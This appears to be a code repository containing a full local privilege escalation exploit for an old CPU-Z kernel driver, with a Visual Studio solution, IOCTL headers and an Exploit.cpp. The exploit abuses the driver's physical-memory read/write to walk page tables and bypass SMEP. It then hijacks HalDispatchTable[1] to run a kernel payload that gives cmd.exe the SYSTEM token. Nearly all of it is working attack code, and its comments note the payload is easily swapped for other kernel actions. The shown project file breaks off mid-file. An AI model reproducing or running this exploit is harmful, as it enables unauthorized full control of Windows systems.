Project Path: arc_shareef12_cpuz_9gonp3gj

Source Tree:

```txt
arc_shareef12_cpuz_9gonp3gj
├── Cpuz.sln
├── Exploit
│   ├── Cpuz.h
│   ├── Exploit.cpp
│   ├── Exploit.vcxproj
│   ├── Exploit.vcxproj.filters
│   ├── Internal.h
│   ├── order.txt
│   └── order64.txt
└── README.md

```

`Cpuz.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 14
VisualStudioVersion = 14.0.24720.0
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Exploit", "Exploit\Exploit.vcxproj", "{346AD8F2-1825-47E6-9283-0B5EE4ACFEE0}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{346AD8F2-1825-47E6-9283-0B5EE4ACFEE0}.Debug|x64.ActiveCfg = Debug|x64
		{346AD8F2-1825-47E6-9283-0B5EE4ACFEE0}.Debug|x64.Build.0 = Debug|x64
		{346AD8F2-1825-47E6-9283-0B5EE4ACFEE0}.Debug|x86.ActiveCfg = Debug|Win32
		{346AD8F2-1825-47E6-9283-0B5EE4ACFEE0}.Debug|x86.Build.0 = Debug|Win32
		{346AD8F2-1825-47E6-9283-0B5EE4ACFEE0}.Release|x64.ActiveCfg = Release|x64
		{346AD8F2-1825-47E6-9283-0B5EE4ACFEE0}.Release|x64.Build.0 = Release|x64
		{346AD8F2-1825-47E6-9283-0B5EE4ACFEE0}.Release|x86.ActiveCfg = Release|Win32
		{346AD8F2-1825-47E6-9283-0B5EE4ACFEE0}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal

```

`Exploit/Cpuz.h`:

```h
#pragma once

#include <Windows.h>

#define IOCTL_READ_CONTROL_REGISTER 0x9C402428
typedef struct _READ_CONTROL_REGISTER {
    union {
        struct _in {
            ULONG Register;
        } in;
        struct _out {
            ULONGLONG Value;
        } out;
    };
} READ_CONTROL_REGISTER, *PREAD_CONTROL_REGISTER;


#define IOCTL_READ_PHYSICAL_MEMORY  0x9C402420
typedef struct _READ_PHYSICAL_MEMORY {
    union {
        struct _in {
            ULONG PhysicalAddressHigh;
            ULONG PhysicalAddressLow;
            ULONG Size;
            ULONG BufferAddressHigh;
            ULONG BufferAddressLow;
        } in;
        struct _out {
            ULONGLONG reserved0;
        } out;
    };
} READ_PHYSICAL_MEMORY, *PREAD_PHYSICAL_MEMORY;


#define IOCTL_WRITE_PHYSICAL_MEMORY 0x9C402430
typedef struct _WRITE_PHYSICAL_MEMORY {
    union {
        struct _in {
            ULONG PhysicalAddressHigh;
            ULONG PhysicalAddressLow;
            ULONG Value;
        } in;
        struct _out {
            ULONGLONG reserved0;
        } out;
    };
} WRITE_PHYSICAL_MEMORY, *PWRITE_PHYSICAL_MEMORY;

```

`Exploit/Exploit.cpp`:

```cpp
/**
 * @brief Local privilege escalation exploit for the CPU-Z kernel driver.
 *
 * The CPU-Z kernel driver before v1.81 allows any usermode application to
 * read control registers, read DWORDs from physical memory, and write
 * DWORDs to physical memory. We abuse this functionality to read cr3 and
 * traverse the page tables in order to build an arbitrary read/write
 * primitive over the entire virtual memory space.
 *
 * With full read/write, we flip the user/supervisor bit on the page table
 * entry (PTE) containing our payload to KernelMode to bypass Supervisor
 * Mode Execution Prevention (SMEP). We then overwrite a function pointer
 * at nt!HalDispatchTable[1] and trigger the payload by calling
 * NtQueryIntervalProfile.
 *
 * As a proof of concept, the payload will assign the SYSTEM token to a
 * suspended cmd.exe process, and resume the process. This should result in a
 * new command prompt running as NT Authority/System. The payload does not
 * rely on static offsets and should thus work on Windows XP+.
 */

#include "Cpuz.h"

#include "Internal.h"

#include <Windows.h>
#include <stdio.h>

#define DEVICE_NAME L"Cpuz139"
#define DEVICE_PATH L"\\\\.\\" DEVICE_NAME

#define DECLARE_SYMBOL(name)  name##_t g_##name = NULL

// Global to save the overwritten function pointer
PVOID g_HalDispatchTableEntry = NULL;

PROCESS_INFORMATION g_NewProcess = { 0 };

// Pointers for the exploit and payload
typedef PVOID * HalDispatchTable_t;
DECLARE_SYMBOL(HalDispatchTable);
DECLARE_SYMBOL(ZwOpenProcess);
DECLARE_SYMBOL(ZwOpenProcessTokenEx);
DECLARE_SYMBOL(ZwDuplicateToken);
DECLARE_SYMBOL(ZwSetInformationProcess);

#ifdef _X86_
BOOL g_IsPaeEnabled = FALSE;

/**
 * @brief Check to see if PAE is enabled. Set g_IsPaeEnabled accordingly.
 * @return TRUE if PAE status was successfully obtained, FALSE otherwise.
 */
static DWORD CheckPaeStatus(void)
{
    DWORD retval = ERROR_SUCCESS;
    HKEY hKey = NULL;
    DWORD value = 0;
    DWORD cbValue = 0;

    retval = RegOpenKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", &hKey);
    if (retval != ERROR_SUCCESS) {
        return retval;
    }

    cbValue = sizeof(value);
    retval = RegQueryValueExA(hKey, "PhysicalAddressExtension", NULL, NULL, (LPBYTE)&value, &cbValue);
    if (retval != ERROR_SUCCESS) {
        return retval;
    }

    g_IsPaeEnabled = (value != 0);
    return ERROR_SUCCESS;
}
#endif


/**
 * @brief Read an x86 control register. Exercises a CPU-Z exploit primitive.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param Register Control register to read.
 * @param Value Value of the control register.
 * @return TRUE if the control register was successfully read.
 */
static BOOL ReadControlRegister(
    __in HANDLE hDevice,
    __in ULONG Register,
    __out PULONGLONG Value)
{
    BOOL bSuccess = TRUE;
    DWORD nBytesReturned = 0;
    READ_CONTROL_REGISTER params = { 0 };

    params.in.Register = Register;

    bSuccess = DeviceIoControl(
        hDevice,
        IOCTL_READ_CONTROL_REGISTER,
        &params.in,
        sizeof(params.in),
        &params.out,
        sizeof(params.out),
        &nBytesReturned,
        NULL);
    if (bSuccess) {
        *Value = params.out.Value;
    }

    return bSuccess;
}


/**
 * @brief Read from physical memory. Exercises a CPU-Z exploit primitive.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param PhysicalAddress Physical address to read from.
 * @param Buffer Output buffer to write memory contents to.
 * @param Size Size of data to read. Must be a multiple of four. This is a
 *      restriction imposed by the CPU-Z driver.
 * @return TRUE if memory was successfully read, FALSE otherwise.
 */
static BOOL ReadPhysicalMemory(
    __in HANDLE hDevice,
    __in ULONGLONG PhysicalAddress,
    __out PVOID Buffer,
    __in ULONG Size)
{
    DWORD nBytesReturned = 0;
    READ_PHYSICAL_MEMORY params = { 0 };

    params.in.PhysicalAddressHigh = PhysicalAddress >> 32;
    params.in.PhysicalAddressLow = PhysicalAddress & 0xffffffff;
    params.in.Size = Size;
#ifdef _X86_
    params.in.BufferAddressHigh = 0;
#else
    params.in.BufferAddressHigh = (ULONG_PTR)Buffer >> 32;
#endif
    params.in.BufferAddressLow = (ULONG_PTR)Buffer & 0xffffffff;

    return DeviceIoControl(
        hDevice,
        IOCTL_READ_PHYSICAL_MEMORY,
        &params.in,
        sizeof(params.in),
        &params.out,
        sizeof(params.out),
        &nBytesReturned,
        NULL);
}


/**
 * @brief Write to physical memory. Exercises a CPU-Z exploit primitive.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param PhysicalAddress Physical address to write to.
 * @param Value Value to write to physical memory.
 * @return TRUE if memory was successfully written, FALSE otherwise.
 */
static BOOL WritePhysicalMemory(
    __in HANDLE hDevice,
    __in ULONGLONG PhysicalAddress,
    __in ULONG Value)
{
    DWORD nBytesReturned = 0;
    WRITE_PHYSICAL_MEMORY params = { 0 };

    params.in.PhysicalAddressHigh = PhysicalAddress >> 32;
    params.in.PhysicalAddressLow = PhysicalAddress & 0xffffffff;
    params.in.Value = Value;
        
    return DeviceIoControl(
        hDevice,
        IOCTL_WRITE_PHYSICAL_MEMORY,
        &params.in,
        sizeof(params.in),
        &params.out,
        sizeof(params.out),
        &nBytesReturned,
        NULL);
}


#ifdef _X86_
/**
 * @brief PAE variant of GetPte for x86. This function should only be used for
 *      PAE x86 systems. See GetPte for additional details.
 *
 * With PAE enabled, there is an additional layer of page tables, PTEs are 8
 * bytes in size, and page table offsets are 9 bits instead of 10.
 */
static BOOL GetPtePae(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress,
    __out PHARDWARE_PTE_PAE PteOut,
    __out_opt PULONGLONG PteAddress)
{
    BOOL bSuccess = TRUE;
    ULONGLONG PdeBase = 0;
    ULONGLONG PteBase = 0;
    ULONGLONG PointerPte = 0;
    HARDWARE_PTE_PAE Pte = { 0 };

    if (!g_IsPaeEnabled) {
        return FALSE;
    }
    
    // Get the PDE base physical address
    PointerPte = Cr3 + PPE_OFFSET_PAE(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }
    PdeBase = Pte.PageFrameNumber << 12;

    // Get the PTE base physical address
    PointerPte = PdeBase + PDE_OFFSET_PAE(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }

    if (Pte.LargePage) {
        goto DONE;  // We just read the PTE for this page
    }
    PteBase = Pte.PageFrameNumber << 12;

    // Get the PTE
    PointerPte = PteBase + PTE_OFFSET_PAE(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }

DONE:
    if (PteAddress) {
        *PteAddress = PointerPte;
    }
    *PteOut = Pte;
    return TRUE;
}
#endif


/**
 * @brief Get the value and address of a Page Table Entry (PTE). This function
 *      should only be used for non-PAE x86 and x86_64 systems.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param Cr3 Value of the cr3 control register.
 * @param VirtualAddress The virtual address whose PTE should be retrieved.
 * @param PteOut Value of the PTE for the given virtual address.
 * @param PteAddress Physical address of the found PTE.
 * @return TRUE if the PTE was successfully obtained. FALSE if the PTE could
 *      not be found. This function will fail if the target page is paged out.
 */
static BOOL GetPte(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress,
    __out PHARDWARE_PTE PteOut,
    __out_opt PULONGLONG PteAddress)
{
    BOOL bSuccess = TRUE;
    ULONGLONG PdeBase = 0;
    ULONGLONG PteBase = 0;
    ULONGLONG PointerPte = 0;
    HARDWARE_PTE Pte = { 0 };

#ifdef _AMD64_
    ULONGLONG PxeBase = Cr3;
    ULONGLONG PpeBase = 0;

    // Get the PPE base physical address
    PointerPte = PxeBase + PXE_OFFSET(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }
    PpeBase = Pte.PageFrameNumber << 12;

    // Get the PDE base physical address
    PointerPte = PpeBase + PPE_OFFSET(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }
    PdeBase = Pte.PageFrameNumber << 12;
#else
    if (g_IsPaeEnabled) {
        return FALSE;
    }
    PdeBase = Cr3;
#endif

    // Get the PTE base physical address
    PointerPte = PdeBase + PDE_OFFSET(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }
    if (Pte.LargePage) {
        goto DONE;  // We just read the PTE for this page
    }
    PteBase = Pte.PageFrameNumber << 12;

    // Get the PTE
    PointerPte = PteBase + PTE_OFFSET(VirtualAddress) * sizeof(Pte);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return FALSE;
    }

DONE:
    if (PteAddress) {
        *PteAddress = PointerPte;
    }
    *PteOut = Pte;
    return TRUE;
}


#ifdef _X86_
/**
 * @brief PAE variant of DisableSmep for x86. This function should only be
 *      used for PAE x86 systems. See DisableSmep for additional details.
 */
static BOOL DisableSmepPae(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress,
    __in ULONG VirtualSize)
{
    BOOL bSuccess = FALSE;
    DWORD nPages = (VirtualSize + (PAGE_SIZE - 1)) / PAGE_SIZE;
    ULONGLONG PteAddress = 0;
    HARDWARE_PTE_PAE Pte;

    for (DWORD i = 0; i < nPages; i++) {
        bSuccess = GetPtePae(hDevice, Cr3, VirtualAddress + i * PAGE_SIZE, &Pte, &PteAddress);
        if (!bSuccess) {
            return FALSE;
        }

        // Set the U/S bit to KernelMode
        Pte.Owner = 0;

        // Write the low-order DWORD (we only mondify the owner bit of the PTE).
        bSuccess = WritePhysicalMemory(hDevice, PteAddress, *(PULONG)&Pte);
        if (!bSuccess) {
            return FALSE;
        }
    }

    return TRUE;
}
#endif


/**
 * @brief Disable Supervisor Mode Execution Prevention for a range of pages
 *      by setting the user/supervisor bit to KernelMode for each page.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param Cr3 Value of the cr3 control register.
 * @param VirtualAddress Base virtual address to disable SMEP for.
 * @param VirtualSize Size of the range to disable SMEP for. SMEP will be
 *      be disabled for all pages containing bytes in the range
 *      [addr,addr+size).
 * @return TRUE if SMEP was successfully disabled for the given range. If
 *      FALSE is returned and VirtualAddress + VirtualSize spans multiple
 *      pages, some pages may be modified.
 */
static BOOL DisableSmep(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress,
    __in ULONG VirtualSize)
{
    BOOL bSuccess = FALSE;
    DWORD nPages = (VirtualSize + (PAGE_SIZE - 1)) / PAGE_SIZE;
    ULONGLONG PteAddress = 0;
    HARDWARE_PTE Pte;

#ifdef _X86_
    if (g_IsPaeEnabled) {
        return DisableSmepPae(hDevice, Cr3, VirtualAddress, VirtualSize);
    }
#endif

    for (DWORD i = 0; i < nPages; i++) {
        bSuccess = GetPte(hDevice, Cr3, VirtualAddress + i * PAGE_SIZE, &Pte, &PteAddress);
        if (!bSuccess) {
            return FALSE;
        }

        // Set the U/S bit to KernelMode
        Pte.Owner = 0;

        // Write the low-order DWORD (we only mondify the owner bit of the PTE).
        bSuccess = WritePhysicalMemory(hDevice, PteAddress, *(PULONG)&Pte);
        if (!bSuccess) {
            return FALSE;
        }
    }

    return TRUE;
}


/**
 * @brief Get the physical address for a virtual address by traversing the
 *      page tables in physical memory.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param Cr3 Value of the cr3 control register.
 * @param VirtualAddress Virtual address to convert into a physical address.
 * @return The physical address for the given virtual address or 0 on error.
 */
static ULONGLONG GetPhysicalAddress(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress)
{
    BOOL bSuccess = TRUE;
    
#ifdef _X86_
    HARDWARE_PTE Pte = { 0 };
    HARDWARE_PTE_PAE PtePae = { 0 };

    if (g_IsPaeEnabled) {
        bSuccess = GetPtePae(hDevice, Cr3, VirtualAddress, &PtePae, NULL);
        if (!bSuccess) {
            return 0;
        }

        if (PtePae.LargePage) {
            return (PtePae.PageFrameNumber << 12) + (VirtualAddress & 0x1fffff);
        }
        return (PtePae.PageFrameNumber << 12) + (VirtualAddress & 0xfff);
    }
    else {
        bSuccess = GetPte(hDevice, Cr3, VirtualAddress, &Pte, NULL);
        if (!bSuccess) {
            return 0;
        }

        if (Pte.LargePage) {
            return (Pte.PageFrameNumber << 12) + (VirtualAddress & 0x3fffff);
        }
        return (Pte.PageFrameNumber << 12) + (VirtualAddress & 0xfff);
    }
#else   // _AMD64_
    HARDWARE_PTE Pte = { 0 };

    bSuccess = GetPte(hDevice, Cr3, VirtualAddress, &Pte, NULL);
    if (!bSuccess) {
        return 0;
    }

    if (Pte.LargePage) {
        return (Pte.PageFrameNumber << 12) + (VirtualAddress & 0x1fffff);
    }

    return (Pte.PageFrameNumber << 12) + (VirtualAddress & 0xfff);
#endif
}


/**
 * @brief Read virtual memory from a single page. Note that this function
 *      does not properly handle page boundaries. If data spans multiple
 *      pages, call this function once per page.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param Cr3 Value of the cr3 control register.
 * @param VirtualAddress Base virtual address to read from. This address
 *      can be a kernel mode address.
 * @param Buffer Buffer to read memory into.
 * @param Size Amount of data to read.
 * @return TRUE if all data was successfully read, FALSE otherwise.
 */
static BOOL ReadVirtualMemory(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in PVOID VirtualAddress,
    __out PVOID Buffer,
    __in ULONG Size)
{
    ULONGLONG PhysicalAddress = GetPhysicalAddress(hDevice, Cr3, (ULONG_PTR)VirtualAddress);
    if (PhysicalAddress == NULL) {
        SetLastError(STATUS_ACCESS_VIOLATION);
        return FALSE;
    }

    return ReadPhysicalMemory(hDevice, PhysicalAddress, Buffer, Size);
}


/**
 * @brief Write virtual memory to a single page. Note that this function
 *      does not properly handle page boundaries. If data spans multiple
 *      pages, call this function once per page.
 * @param hDevice Open handle to the CPU-Z driver.
 * @param Cr3 Value of the cr3 control register.
 * @param VirtualAddress Base virtual address to write to. This address
 *      can be a kernel mode address.
 * @param Buffer Data to write.
 * @param Size Amount of data to write.
 * @return TRUE if all data was successfully written, FALSE otherwise.
 */
static BOOL WriteVirtualMemory(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in PVOID VirtualAddress,
    __in PVOID Buffer,
    __in SIZE_T Size)
{
    BOOL bSuccess = TRUE;

    if (Size % sizeof(ULONG) != 0) {
        SetLastError(ERROR_OFFSET_ALIGNMENT_VIOLATION);
        return FALSE;
    }

    for (SIZE_T i = 0; i < Size / sizeof(ULONG); i++) {
        PULONG addr = (PULONG)VirtualAddress + i;
        ULONGLONG PhysicalAddress = GetPhysicalAddress(hDevice, Cr3, (ULONG_PTR)addr);
        if (PhysicalAddress == NULL) {
            SetLastError(STATUS_ACCESS_VIOLATION);
            return FALSE;
        }

        bSuccess = WritePhysicalMemory(hDevice, PhysicalAddress, ((PULONG)Buffer)[i]);
        if (!bSuccess) {
            return FALSE;
        }
    }

    return TRUE;
}


/**
 * @brief Get the base address and filepath for ntoskrnl.exe. This function
 *      will not work in a low-integrity process due to the use of
 *      ntdll!NtQuerySystemInformation(SystemModuleInformation,...).
 * @param BaseAddress The found base address of the kernel.
 * @param Filepath An absolute path to the kernel on disk.
 * @return TRUE if all info was found, FALSE otherwise.
 */
static BOOL GetNtosInformation(
    __out PULONG_PTR BaseAddress,
    __out LPSTR Filepath)
{
    HMODULE Ntdll = GetModuleHandleA("ntdll.dll");
    if (Ntdll == NULL) {
        return FALSE;
    }

    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(Ntdll, "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        return FALSE;
    }

    ULONG cbModuleInfo = 0;
    NTSTATUS retval = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &cbModuleInfo);
    if (retval != STATUS_INFO_LENGTH_MISMATCH) {
        return FALSE;
    }

    PSYSTEM_MODULES pModules = (PSYSTEM_MODULES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbModuleInfo);
    if (pModules == NULL) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    retval = NtQuerySystemInformation(SystemModuleInformation, pModules, cbModuleInfo, NULL);
    if (retval != STATUS_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, pModules); 
        SetLastError(retval);
        return FALSE;
    }
    
    for (DWORD i = 0; i < pModules->Count; i++) {
        PSYSTEM_MODULE_INFORMATION pModuleInfo = &pModules->Modules[i];
        LPSTR szName = pModuleInfo->ImageName + pModuleInfo->ModuleNameOffset;
        if (strcmp(szName, "ntoskrnl.exe") == 0 ||
            strcmp(szName, "ntkrnlpa.exe") == 0 ||
            strcmp(szName, "ntkrnlmp.exe") == 0 ||
            strcmp(szName, "ntkrpamp.exe") == 0)
        {
            *BaseAddress = (ULONG_PTR)pModuleInfo->Base;
            strcpy_s(Filepath, MAX_PATH, "C:\\Windows\\System32\\");
            strcat_s(Filepath, MAX_PATH, szName);
            HeapFree(GetProcessHeap(), 0, pModules);
            return TRUE;
        }
    }

    HeapFree(GetProcessHeap(), 0, pModules);
    SetLastError(ERROR_NOT_FOUND);
    return FALSE;
}


/**
 * @brief Resolve kernel symbols required for the payload.
 * @return TRUE if all symbols were successfully resolved, FALSE otherwise.
 */
static BOOL ResolveKernelSymbols(VOID)
{
    // Get kernel base address and file path
    ULONG_PTR NtosBaseAddress = 0;
    CHAR szNtosPath[MAX_PATH] = { 0 };
    BOOL bSuccess = GetNtosInformation(&NtosBaseAddress, szNtosPath);
    if (!bSuccess) {
        return FALSE;
    }

    // Map the kernel into userspace
    HMODULE Ntos = LoadLibraryExA(szNtosPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (Ntos == NULL) {
        return FALSE;
    }

    // Resolve any function pointers needed for the exploit and payload
#define RESOLVE_SYMBOL(name) do { \
    ULONG_PTR addr = (ULONG_PTR)GetProcAddress(Ntos, #name); \
    if (addr == NULL) { \
        printf("[-] Error resolving kernel symbol: %s\n", #name); \
        FreeLibrary(Ntos); \
        return FALSE; \
    } \
    g_##name = (name##_t)(NtosBaseAddress + (addr - (ULONG_PTR)Ntos)); \
} while (0);

    RESOLVE_SYMBOL(HalDispatchTable);
    RESOLVE_SYMBOL(ZwOpenProcess);
    RESOLVE_SYMBOL(ZwOpenProcessTokenEx);
    RESOLVE_SYMBOL(ZwDuplicateToken);
    RESOLVE_SYMBOL(ZwSetInformationProcess);

    FreeLibrary(Ntos);
    return TRUE;
}


/**
 * @brief Payload that will be executed with kernel-mode privileges.
 *
 * As a proof of concept, this function will assign the system process's token
 * to a given process. However, it can be easily modified to take any other
 * kernel mode action.
 *
 * Since SMEP will be disabled for the entire page this code exists on, this
 * code must be copied to a fresh page to prevent an access violation. In order
 * to obtain the size of this function, it is explicitly placed before the
 * PayloadEnd function in the object file by specifying /ORDER to the linker.
 * We can then dynamically compute PayloadEnd - Payload to get the size. These
 * two functions must be non-static for /ORDER to work.
 */
ULONG WINAPI Payload(
    ULONG a,
    ULONG b,
    ULONG c,
    ULONG d)
{
    // Restore the HalDispatchTable
    g_HalDispatchTable[1] = g_HalDispatchTableEntry;

    // Open the system process
    HANDLE hSystemProcess = NULL;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID ClientId = { (HANDLE)4, 0 };
    InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
    NTSTATUS retval = g_ZwOpenProcess(&hSystemProcess, PROCESS_ALL_ACCESS, &oa, &ClientId);
    if (retval != STATUS_SUCCESS) {
        return 0;
    }

    // Open the system token
    HANDLE hSystemToken = NULL;
    retval = g_ZwOpenProcessTokenEx(hSystemProcess, TOKEN_ALL_ACCESS | TOKEN_ASSIGN_PRIMARY, OBJ_KERNEL_HANDLE, &hSystemToken);
    if (retval != STATUS_SUCCESS) {
        return 0;
    }

    // Duplicate the system token
    HANDLE hDuplicatedToken = NULL;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    retval = g_ZwDuplicateToken(hSystemToken, MAXIMUM_ALLOWED, &oa, FALSE, TokenPrimary, &hDuplicatedToken);
    if (retval != STATUS_SUCCESS) {
        return 0;
    }
     
    // Update the specified process's token
    PROCESS_ACCESS_TOKEN TokenInformation = { hDuplicatedToken, 0 };
    retval = g_ZwSetInformationProcess(g_NewProcess.hProcess, ProcessAccessToken, &TokenInformation, sizeof(TokenInformation));
    if (retval != STATUS_SUCCESS) {
        return 0;
    }
    
    return 0;
}
ULONG WINAPI PayloadEnd(void)
{
    return 0;
}


int main(int argc, char *argv[])
{
    DWORD retval = ERROR_SUCCESS;
    BOOL bSuccess = FALSE;
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    ULONGLONG Cr3 = 0;
    PVOID pPayload = NULL;
    ULONG_PTR cbPayload = (ULONG_PTR)PayloadEnd - (ULONG_PTR)Payload;

#ifdef _X86_
    // Check to see if PAE is enabled
    retval = CheckPaeStatus();
    if (retval != ERROR_SUCCESS) {
        printf("[-] Could not get PAE status: %lu\n", retval);
        return 1;
    }
    printf(g_IsPaeEnabled ? "[*] PAE is enabled\n" : "[*] PAE is not enabled\n");
#endif

    // Open the vulnerable device
    hDevice = CreateFileW(
        DEVICE_PATH,
        0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Could not open device: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Opened device %ws Handle=0x%zx\n", DEVICE_PATH, (size_t)hDevice);

    // Get CR3 value so we can read/write all virtual memory
    bSuccess = ReadControlRegister(hDevice, 3, &Cr3);
    if (!bSuccess) {
        printf("[-] Could not get page table base: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Read CR3: 0x%llx\n", Cr3);

    // Resolve kernel addresses needed for the exploit/payload
    bSuccess = ResolveKernelSymbols();
    if (!bSuccess) {
        printf("[-] Could not resolve kernel symbols: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Resolved kernel functions\n");

    // Copy the payload to a new page since disabling SMEP will make the whole page KernelMode
    pPayload = VirtualAlloc(NULL, cbPayload, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pPayload == NULL) {
        printf("[-] Could not allocate memory for payload: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    memcpy(pPayload, Payload, cbPayload);
    printf("[*] Copied payload to 0x%p\n", pPayload);

    // Overwrite the second entry in HalDispatchTable with a pointer to our payload
    // Save the original value of the entry
    bSuccess = ReadVirtualMemory(hDevice, Cr3, &g_HalDispatchTable[1], &g_HalDispatchTableEntry, sizeof(PVOID));
    if (!bSuccess) {
        printf("[-] Could not save HalDispatchTable entry: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Saved HalDispatchTable[1]: 0x%p\n", g_HalDispatchTableEntry);

    // Write our function pointer
    bSuccess = WriteVirtualMemory(hDevice, Cr3, &g_HalDispatchTable[1], &pPayload, sizeof(PVOID));
    if (!bSuccess) {
        printf("[-] Could not overwrite HalDispatchTable entry: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Overwrote HalDispatchTable[1] with userspace function pointer: 0x%p\n", pPayload);

    // Disable SMEP by marking our payload as a supervisor page
    bSuccess = DisableSmep(hDevice, Cr3, (ULONG_PTR)pPayload, (ULONG)cbPayload);
    if (!bSuccess) {
        printf("[-] Could not update payload U/S PTE entry");
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Disabled SMEP for payload\n");

    // Create a new suspended process
    printf("[*] Spawning suspended process...\n");
    STARTUPINFO si = { 0 };
    bSuccess = CreateProcess(NULL, "cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &g_NewProcess);
    if (!bSuccess) {
        printf("[-] Could not spawn process  error=%lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }

    // Find NtQueryIntervalProfile in order to trigger the exploit
    HMODULE Ntdll = GetModuleHandleA("ntdll.dll");
    if (Ntdll == NULL) {
        CloseHandle(hDevice);
        return 1;
    }

    NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(Ntdll, "NtQueryIntervalProfile");
    if (NtQueryIntervalProfile == NULL) {
        CloseHandle(hDevice);
        return 1;
    }

    // Trigger the exploit
    printf("[*] Triggering exploit...\n");
    ULONG Junk = 0;
    NtQueryIntervalProfile(2, &Junk);    

    printf("[*] Resuming suspended process...\n");
    ResumeThread(g_NewProcess.hThread);

    printf("[+] Done\n");
    CloseHandle(hDevice);
    return 0;
}

```

`Exploit/Exploit.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{346AD8F2-1825-47E6-9283-0B5EE4ACFEE0}</ProjectGuid>
    <RootNamespace>Exploit</RootNamespace>
    <WindowsTargetPlatformVersion>8.1</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
